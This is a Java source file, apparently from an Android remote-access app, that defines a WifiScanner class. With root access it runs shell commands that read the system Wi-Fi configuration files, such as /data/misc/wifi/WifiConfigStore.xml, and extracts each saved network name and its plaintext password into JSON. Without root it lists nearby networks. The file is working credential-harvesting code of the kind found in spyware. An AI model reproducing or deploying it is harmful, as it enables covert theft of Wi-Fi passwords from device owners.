package com.remote.app.Managers;

import android.content.Context;
import android.net.wifi.WifiManager;

import android.net.wifi.ScanResult;
import android.util.Log;

import com.remote.app.ExecTerminal;
import com.remote.app.R;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.json.XML;

import java.util.List;

public class WifiScanner {



    public static JSONObject scan(Context context,boolean pwd) {
        try {
            JSONObject dRet = new JSONObject();
            JSONArray JsonArr = new JSONArray();

            if(pwd == true){
                JSONArray array = getWiFiPasswordList(context).getJSONObject(0).getJSONObject("WifiConfigStoreData").getJSONObject("NetworkList").getJSONArray("Network");

                for (int k = 0; k < array.length(); k++) {

                    JSONObject network4 = array.getJSONObject(k);
                    JSONArray network5 = network4.getJSONObject("WifiConfiguration").getJSONArray("string");


                    //JSONObject arr = network.getJSONObject("NetworkList");
                    //Log.d("MYLOGSNETWW",network4.getJSONObject("WifiConfiguration").toString());

                    String SSID = network5.getJSONObject(1).getString("content");
                    String BSSID = "";
                    String PreSharedKey = network5.getJSONObject(2).getString("content");
                    //PreSharedKey = PreSharedKey.substring(1,PreSharedKey.length()-1);


                    JSONObject JsonObj = new JSONObject();
                    JsonObj.put(base.WIFI.BSSID, BSSID);
                    JsonObj.put(base.WIFI.SSID,SSID.substring(1, SSID.length() -1));
                    JsonObj.put(base.WIFI.PWD,PreSharedKey.substring(1, PreSharedKey.length() -1) );
                    JsonObj.put(base.WIFI.ROOT,true );
                    JsonArr.put(JsonObj);
                }
                dRet.put(base.WIFI.NETWORKS, JsonArr);

            }
            else{
                WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
                if (wifiManager != null && wifiManager.isWifiEnabled()) {
                    wifiManager.startScan();

                    List scanResults = wifiManager.getScanResults();

                    if (scanResults != null && scanResults.size() > 0) {

                        int i = 0;
                        while (i < scanResults.size() && i < 10) {
                            ScanResult scanResult = (ScanResult) scanResults.get(i);

                            JSONObject jSONObject = new JSONObject();
                            jSONObject.put(base.WIFI.BSSID, scanResult.BSSID);
                            jSONObject.put(base.WIFI.SSID, scanResult.SSID);
                            JsonArr.put(jSONObject);

                            i++;
                        }
                        dRet.put(base.WIFI.NETWORKS, JsonArr);

                        return dRet;
                    }
                }
            }
            return dRet;
        } catch (Throwable th) {
            Log.e("MtaSDK", "isWifiNet error", th);
            return null;
        }
    }

    private static String execute(String cmd) {
        final ExecTerminal et = new ExecTerminal();
        final ExecTerminal.ExecResult res;

        res = et.execSu(cmd);

        return res.getStdOut();
    }

    private static JSONArray getWiFiPasswordList(Context context) {
        JSONArray jsonArray = new JSONArray();
        //JSONObject jsonObject = new JSONObject();
        final String[] shellCommands = context.getResources().getStringArray(R.array.shellCommands);
        String[] commands = new String[]{"cat /data/misc/wifi/wpa_supplicant.conf","cat /data/wifi/bcm_supp.conf","cat /data/misc/wifi/wpa.conf","cat /data/misc/wifi/WifiConfigStore.xml"};

        for (int i = 0; i < 4; i++) {
            String result = execute(commands[i]);
            if (result.trim().length() > 0) {
                JSONObject jsonObj = new JSONObject();
                try {
                    jsonObj = XML.toJSONObject(result);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                jsonArray.put(jsonObj);
            }
        }


        return jsonArray;
    }



}
